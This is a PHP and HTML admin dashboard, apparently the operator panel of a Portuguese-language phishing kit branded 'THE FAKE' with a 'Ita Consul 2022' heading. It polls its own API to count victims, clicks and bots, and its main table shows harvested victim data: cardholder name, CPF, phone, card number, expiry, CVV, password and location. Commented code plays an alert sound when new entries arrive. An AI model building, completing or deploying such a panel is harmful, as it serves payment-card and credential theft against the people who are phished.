<?php

session_start();

require_once("../../api/db.php");

date_default_timezone_set('America/Sao_Paulo');
$hojee = date('d/m/Y');

if((!isset ($_SESSION['nome_admin']) == true) and (!isset ($_SESSION['senha_admin']) == true))
{
  unset($_SESSION['nome_admin']);
  unset($_SESSION['senha_admin']);
  header('location: ../login.php');
  }	 	
			
		
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="apple-touch-icon" sizes="76x76" href="assets/img/apple-icon.png">
  <link rel="icon" type="image/png" href="assets/img/favicon.png">

  <title>
   Painel
  </title>
  <!--     Fonts and icons     -->
  <link href="https://fonts.googleapis.com/css?family=Poppins:200,300,400,600,700,800" rel="stylesheet" />
  <link href="https://use.fontawesome.com/releases/v5.0.6/css/all.css" rel="stylesheet">
  <!-- Nucleo Icons -->
  <link href="assets/css/nucleo-icons.css" rel="stylesheet" />
  <!-- CSS Files -->
  <link href="assets/css/black-dashboard.css?v=1.0.0" rel="stylesheet" />
  <!-- CSS Just for demo purpose, don't include it in your project -->
  <link href="assets/demo/demo.css" rel="stylesheet" />
</head>

<body class="">
  <div class="wrapper">
    <div class="sidebar">
      <!--
        Tip 1: You can change the color of the sidebar using: data-color="blue | green | orange | red"
    -->
      <div class="sidebar-wrapper">
        <div class="logo">
          <a href="javascript:void(0)" class="simple-text logo-mini">
            T
          </a>
          <a href="javascript:void(0)" class="simple-text logo-normal">
            THE FAKE
          </a>
        </div>
        <ul class="nav">
          <li class="active">
            <a href="index.php">
              <i class="tim-icons icon-chart-pie-36"></i>
              <p>Home</p>
            </a>
          </li>
			 
           <li>
            <a href="config.php">
              <i class="tim-icons icon-settings"></i>
              <p>Configuração</p>
            </a>
          </li>
        </ul>
      </div>
    </div>
    <div class="main-panel">
      <!-- Navbar -->
      <nav class="navbar navbar-expand-lg navbar-absolute navbar-transparent">
        <div class="container-fluid">
          <div class="navbar-wrapper">
            <div class="navbar-toggle d-inline">
              <button type="button" class="navbar-toggler">
                <span class="navbar-toggler-bar bar1"></span>
                <span class="navbar-toggler-bar bar2"></span>
                <span class="navbar-toggler-bar bar3"></span>
              </button>
            </div>
            <a class="navbar-brand" href="javascript:void(0)">Painel</a>
          </div>
          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navigation" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-bar navbar-kebab"></span>
            <span class="navbar-toggler-bar navbar-kebab"></span>
            <span class="navbar-toggler-bar navbar-kebab"></span>
          </button>
          <div class="collapse navbar-collapse" id="navigation">
            <ul class="navbar-nav ml-auto">
              
             
              <li class="dropdown nav-item">
                <a href="#" class="dropdown-toggle nav-link" data-toggle="dropdown">
                  <div class="photo">
                    <img src="assets/img/anime3.png" alt="Profile Photo">
                  </div>
                  <b class="caret d-none d-lg-block d-xl-block"></b>
                  <p class="d-lg-none">
                    Sair
                  </p>
                </a>
                <ul class="dropdown-menu dropdown-navbar">
                 
                  <li class="dropdown-divider"></li>
                  <li class="nav-link"><a href="sair.php" class="nav-item dropdown-item">Sair</a></li>
                </ul>
              </li>
              <li class="separator d-lg-none"></li>
            </ul>
          </div>
        </div>
      </nav>
      <div class="modal modal-search fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="searchModal" aria-hidden="true">
        <div class="modal-dialog" role="document">
          <div class="modal-content">
            <div class="modal-header">
              <input type="text" class="form-control" id="inlineFormInputGroup" placeholder="SEARCH">
              <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                <i class="tim-icons icon-simple-remove"></i>
              </button>
            </div>
          </div>
        </div>
      </div>
      <!-- End Navbar -->
      <div class="content">
        <div class="row">
          <div class="col-12">
            <div class="card card-chart">
              <div class="card-header ">
                <div class="row">
                  <div class="col-sm-6 text-left">
                    <h5 class="card-category">Ita Consul 2022</h5>
                    <h2 class="card-title text-danger">Estatísticas</h2>
                  </div>
                 
                </div>
              </div>
             
            </div>
          </div>
        </div>
        <div class="row">
         
		  <div class="col-lg-4">
            <div class="card card-chart">
              <div class="card-header">
                <h5 class="card-category">Online</h5>
                <h3 class="card-title"><i class="tim-icons icon-single-02"></i><b id="onlines"> </b></h3>
              </div>
             
            </div>
          </div>
		  
		  <div class="col-lg-4">
            <div class="card card-chart">
              <div class="card-header">
                <h5 class="card-category">Cliques</h5>
                <h3 class="card-title"><i class="tim-icons icon-single-02"></i><b id="cliques"> </b></h3>
              </div>
             
            </div>
          </div>
          <div class="col-lg-4">
            <div class="card card-chart">
              <div class="card-header">
                <h5 class="card-category">Cadastros</h5>
                <h3 class="card-title"><i class="tim-icons icon-badge"></i><b id="cadastros"> </b></h3>
              </div>
             
            </div>
          </div>
          <div class="col-lg-4">
            <div class="card card-chart">
              <div class="card-header">
                <h5 class="card-category">Bots</h5>
                <h3 class="card-title"><i class="tim-icons icon-lock-circle"></i><b id="bots"> </b></h3>
              </div>
             
            </div>
          </div>
		  
		 
		  <div class="col-lg-4">
            <div class="card card-chart">
              <div class="card-header">
                <h5 class="card-category">Cliques Mobile</h5>
                <h3 class="card-title"><i class="tim-icons icon-wifi"></i><b id="mobiles"> </b></h3>
              </div>
             
            </div>
          </div>
		  
		  <div class="col-lg-4">
            <div class="card card-chart">
              <div class="card-header">
                <h5 class="card-category">Cliques Desktop</h5>
                <h3 class="card-title"><i class="tim-icons icon-tv-2"></i><b id="desktops"> </b></h3>
              </div>
             
            </div>
          </div>

		 
		 
        </div>
       	
		<div class="row">
         <div class="col-md-12">
            <div class="card  card-plain">
             <div class="row">
          <div class="col-12">
            <div class="card card-chart">
              <div class="card-header ">
                <div class="row">
                  <div class="col-sm-6 text-left">
                    <h2 class="card-title text-danger">Informações de Cadastros</h2>
                  </div>
                 
                </div>
              </div>
             
            </div>
          </div>
        </div>
              <div class="card-body">
                <div class="table-responsive ps">
                  <table class="table tablesorter " id="">
                    <thead class=" text-primary">
                      <tr>
						<th>
                          Titular        
						</th>
                        <th>
                          Cpf        
						  </th>
                        <th>
                          Telefone
                        </th>
                        <th>
                          Número
                        </th>
                        <th>
                          Data
                        </th>
						<th>
                          Cvv
                        </th>
						<th>
                          Senha
                        </th>
						<th>
                          Localização
                        </th>
                      </tr>
                    </thead>
					<script>
					
					 var contador = 0;
					 var audioCliente = new Audio('chegou.mp3'); 
					  
					 setInterval(function(){
					 
					 $.post('../../api/', {cliente:"totalOnline"},function(on){
					 document.getElementById("onlines").innerHTML=on;
					 });

					 $.post('../../api/', {cliente:"cadastros"},function(date){
					 document.getElementById("adddados").innerHTML=date;
					 });
					 
					 $.post('../../api/', {cliente:"estatisticas"},function(datex){
					 	    
							var infos = datex.split("|");
							var click = infos[0];
							var bots = infos[1];
							var mob = infos[2];
							var desk= infos[3];
							var cad = infos[4];
							
							document.getElementById("cliques").innerHTML=click;
							document.getElementById("bots").innerHTML=bots;
							document.getElementById("mobiles").innerHTML=mob;
							document.getElementById("desktops").innerHTML=desk;
							document.getElementById("cadastros").innerHTML=cad;
							
					 });
					 
					 
	                 }, 4000);
					 /*
					 $.ajax({
							url: "api.php",
							type: "POST",
							async: false,
							data : {'acao':"pegadados"},
							success: function(date){
							if((date.match(/theb/g) || []).length > contador){
							document.getElementById("adddados").innerHTML=date;
							audioCliente.play();
							contador=(date.match(/theb/g) || []).length;
							}else{
							document.getElementById("adddados").innerHTML=date;
							contador=(date.match(/theb/g) || []).length;
							}
							},
							error: function(error){
							 console.log(error);
							}
						});	
						/*
						$.ajax({
							url: "api.php",
							type: "POST",
							async: false,
							data : {'acao':"pegaestatisticas"},
							success: function(date){
							var infos = date.split("|");
							var v = infos[0];
							var m = infos[1];
							var p = infos[2];
							var r = infos[3];
							var d = infos[4];
							
							document.getElementById("addvisitas").innerHTML=v;
							document.getElementById("addlog").innerHTML=d;
							document.getElementById("addmobile").innerHTML=m;
							document.getElementById("addpc").innerHTML=p;
							document.getElementById("addrobo").innerHTML=r;
							
							},
							error: function(error){
							 console.log(error);
							}
						});	*/
					
					</script>
                    <tbody id="adddados">
                  
                      
                    </tbody>
                  </table>
				  
				  
				  
                <div class="ps__rail-x" style="left: 0px; bottom: 0px;"><div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div></div><div class="ps__rail-y" style="top: 0px; right: 0px;"><div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div></div></div>
              </div>
			  
			  
                 
            </div>
          </div>
        </div>
		
		
		<!-- LINHA LINHA -->


		</div>
      <footer class="footer">
        <div class="container-fluid">
          <ul class="nav">
            <li class="nav-item">
              <a href="javascript:void(0)" class="nav-link">
                The Fake 2022 All Rights Reserved
              </a>
            </li>
          
          </ul>
          <div class="copyright">
            ©
            <script>
              document.write(new Date().getFullYear())
            </script> made with <i class="tim-icons icon-heart-2"></i> by
            <a href="javascript:void(0)" target="_blank">THE FAKE.</a>
          </div>
        </div>
      </footer>
    </div>
  </div>
<script>


</script>

  <!--   Core JS Files   -->
  <script src="assets/js/core/jquery.min.js"></script>
  <script src="assets/js/core/popper.min.js"></script>
  <script src="assets/js/core/bootstrap.min.js"></script>
  <script src="assets/js/plugins/perfect-scrollbar.jquery.min.js"></script>
  <script src="assets/js/api.js"></script>

  <script src="assets/js/plugins/chartjs.min.js"></script>
  <!--  Notifications Plugin    -->
  <script src="assets/js/plugins/bootstrap-notify.js"></script>
  <!-- Control Center for Black Dashboard: parallax effects, scripts for the example pages etc -->
  <script src="assets/js/black-dashboard.min.js?v=1.0.0"></script><!-- Black Dashboard DEMO methods, don't include it in your project! -->
  <script src="assets/demo/demo.js"></script>
  <script>
    $(document).ready(function() {


      $().ready(function() {
        $sidebar = $('.sidebar');
        $navbar = $('.navbar');
        $main_panel = $('.main-panel');

        $full_page = $('.full-page');

        $sidebar_responsive = $('body > .navbar-collapse');
        sidebar_mini_active = true;
        white_color = false;

        window_width = $(window).width();

        fixed_plugin_open = $('.sidebar .sidebar-wrapper .nav li.active a p').html();



        $('.fixed-plugin a').click(function(event) {
          if ($(this).hasClass('switch-trigger')) {
            if (event.stopPropagation) {
              event.stopPropagation();
            } else if (window.event) {
              window.event.cancelBubble = true;
            }
          }
        });

        $('.fixed-plugin .background-color span').click(function() {
          $(this).siblings().removeClass('active');
          $(this).addClass('active');

          var new_color = $(this).data('color');

          if ($sidebar.length != 0) {
            $sidebar.attr('data', new_color);
          }

          if ($main_panel.length != 0) {
            $main_panel.attr('data', new_color);
          }

          if ($full_page.length != 0) {
            $full_page.attr('filter-color', new_color);
          }

          if ($sidebar_responsive.length != 0) {
            $sidebar_responsive.attr('data', new_color);
          }
        });

        $('.switch-sidebar-mini input').on("switchChange.bootstrapSwitch", function() {
          var $btn = $(this);

          if (sidebar_mini_active == true) {
            $('body').removeClass('sidebar-mini');
            sidebar_mini_active = false;
            blackDashboard.showSidebarMessage('Sidebar mini deactivated...');
          } else {
            $('body').addClass('sidebar-mini');
            sidebar_mini_active = true;
            blackDashboard.showSidebarMessage('Sidebar mini activated...');
          }

          // we simulate the window Resize so the charts will get updated in realtime.
          var simulateWindowResize = setInterval(function() {
            window.dispatchEvent(new Event('resize'));
          }, 180);

          // we stop the simulation of Window Resize after the animations are completed
          setTimeout(function() {
            clearInterval(simulateWindowResize);
          }, 1000);
        });

        $('.switch-change-color input').on("switchChange.bootstrapSwitch", function() {
          var $btn = $(this);

          if (white_color == true) {

            $('body').addClass('change-background');
            setTimeout(function() {
              $('body').removeClass('change-background');
              $('body').removeClass('white-content');
            }, 900);
            white_color = false;
          } else {

            $('body').addClass('change-background');
            setTimeout(function() {
              $('body').removeClass('change-background');
              $('body').addClass('white-content');
            }, 900);

            white_color = true;
          }


        });

        $('.light-badge').click(function() {
          $('body').addClass('white-content');
        });

        $('.dark-badge').click(function() {
          $('body').removeClass('white-content');
        });
      });
    });
  </script>
  <script>
    $(document).ready(function() {
      // Javascript method's body can be found in assets/js/demos.js
      demo.initDashboardPageCharts();

    });
  </script>
  <script src="https://cdn.trackjs.com/agent/v3/latest/t.js"></script>
  <script>
    window.TrackJS &&
      TrackJS.install({
        token: "ee6fab19c5a04ac1a32a645abde4613a",
        application: "black-dashboard-free"
      });
  </script>
 
</body>

</html>